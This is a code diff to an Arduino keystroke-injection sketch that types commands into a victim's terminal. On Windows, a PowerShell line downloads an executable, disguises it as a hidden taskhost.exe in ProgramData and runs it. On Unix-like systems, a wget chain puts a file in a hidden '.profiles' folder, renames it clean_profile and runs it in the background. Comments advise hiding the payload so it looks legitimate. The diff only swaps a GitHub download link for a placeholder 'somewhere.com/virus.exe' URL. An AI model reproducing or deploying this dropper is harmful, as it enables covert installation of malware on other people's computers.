@@ -35,7 +35,7 @@ void loop() {
       Keyboard.write(KEY_RETURN);
       delay(100);
       //download your file and rename it to a common name, hide the file, launch it and exit console (your .exe needs to be console independant)
-      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('https://github.com/EzLucky/tests/blob/master/a.exe?raw=true', 'C:/ProgramData/WindowsApp/taskhost.exe');\" & attrib +h C:/ProgramData/WindowsApp/taskhost.exe & C:/ProgramData/WindowsApp/taskhost.exe & exit");
+      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('http://somewhere.com/virus.exe', 'C:/ProgramData/WindowsApp/taskhost.exe');\" & attrib +h C:/ProgramData/WindowsApp/taskhost.exe & C:/ProgramData/WindowsApp/taskhost.exe & exit");
       delay(100);
       Keyboard.write(KEY_RETURN);
       break;
@@ -47,7 +47,7 @@ void loop() {
       Keyboard.releaseAll();
       delay(100);
       //create a hidden directory for your file (.profiles seems quite legit), download it and rename it (try to hide as much as you can) and make it executable, launch it in background and exit terminal
-      Keyboard.print("mkdir .profiles && cd .profiles && wget https://github.com/EzLucky/tests/blob/master/a.exe?raw=true && mv a.exe?raw=true clean_profile && chmod +x clean_profile && (nohup bash clean_profile &); exit");
+      Keyboard.print("mkdir .profiles && cd .profiles && wget http://somewhere.com/virus.exe && mv virus.exe clean_profile && chmod +x clean_profile && (nohup bash clean_profile &); exit");
       delay(100);
       Keyboard.write(KEY_RETURN);
   }
